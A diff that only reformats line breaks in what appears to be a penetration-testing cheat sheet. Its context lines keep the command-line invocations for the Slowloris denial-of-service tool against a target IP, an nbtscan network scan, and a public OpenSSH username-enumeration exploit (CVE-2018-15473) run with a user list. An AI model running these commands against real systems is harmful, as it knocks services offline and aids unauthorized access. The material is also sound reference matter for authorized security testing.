@@ -37,7 +37,9 @@ Slowloris Perl
 ```
 perl slowloris.pl -dns [IP_TARGET] -port 80 -timeout 200 -num 5000 -cache
 ```
-Slowloris Python. Source : (https://github.com/gkbrk/slowloris)
+Slowloris Python
+
+Source : (https://github.com/gkbrk/slowloris)
 ```
 git clone https://github.com/gkbrk/slowloris.git
 cd slowloris
@@ -108,8 +110,10 @@ nbtscan [NETWORK_IP]
 
 # Brute Force
 ## Hydra
-CVE-2018-15473 (OpenSSH 2.3 < 7.7)\
+CVE-2018-15473 (OpenSSH 2.3 < 7.7)
+
 Source : https://www.exploit-db.com/exploits/45233\
+
 Run Exploit
 ```
 python3 45233.py --userList user.txt [IP_TARGET] --outputFile hasil.txt
